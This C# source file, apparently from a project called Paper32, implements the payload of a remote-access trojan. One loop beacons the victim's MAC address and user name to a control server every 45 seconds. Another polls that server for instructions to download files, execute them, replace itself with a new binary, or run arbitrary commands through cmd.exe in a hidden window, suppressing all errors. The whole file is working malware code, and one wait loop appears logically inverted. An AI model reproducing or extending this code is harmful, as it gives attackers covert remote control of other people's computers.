using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Paper32
{
    class Payload
    {
        static public void DoTrace()
        {
            while (true)
            {
                ApiClient.DoTrace(Info.URL, Info.Mac, Info.User, Info.Version);
                Thread.Sleep(45000);
            }
        }
        static public void MainPayload()
        {
            while (true)
            {
                Thread.Sleep(3000);
                try
                {
                    ApiClient c = new ApiClient(Info.URL, Info.Mac, Info.User, Info.HTTPAuth);
                    string inst = c.GetInstruction().Replace("~~dp~~", Info.DesktopFolderPath).Replace("~~ip~~", Info.InstallFolderPath);
                    string it = new Regex(@"Instruction-Type: (.*?);;;;").Match(inst).Groups[1].Value;
                    string source = new Regex(@"Source: (.*?);;;;").Match(inst).Groups[1].Value;
                    string dest = new Regex(@"Destination: (.*?);;;;").Match(inst).Groups[1].Value;
                    string command = new Regex(@"Command: (.*?);;;;").Match(inst).Groups[1].Value;
                    if (it == "download")
                    {
                        if (source == "" || dest == "")
                        {
                            c.DeleteInstruction(); // Invalid instruction
                            continue;
                        }
                        try
                        {
                            new WebClient().DownloadFile(source, dest);
                            c.DeleteInstruction();
                        }
                        catch { }
                    }
                    else if (it == "execute")
                    {
                        if (dest == "")
                        {
                            c.DeleteInstruction(); // Invalid instruction
                            continue;
                        }
                        try
                        {
                            Process.Start(dest);
                            c.DeleteInstruction();
                        }
                        catch { }
                    }
                    else if (it == "update")
                    {
                        if (source == "" || dest == "")
                        {
                            c.DeleteInstruction(); // Invalid instruction
                            continue;
                        }
                        try
                        {
                            new WebClient().DownloadFile(source, dest);
                            Process.Start(dest);
                            c.DeleteInstruction();
                            Tools.GoodExit();
                        }
                        catch { }
                    }
                    else if (it == "command")
                    {
                        if (command == "")
                        {
                            c.DeleteInstruction(); // Invalid instruction
                            continue;
                        }
                        try
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe"; // start "" "path"
                            p.StartInfo.Arguments = "/C " + command;
                            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // Make a system to choose the style mode
                            p.Start();
                            while (p.HasExited) ;
                            c.DeleteInstruction();
                        }
                        catch { }
                    }
                    else
                    {
                        c.DeleteInstruction(); // Invalid instruction type
                    }
                }
                catch { }
            }
        } 
    }
}
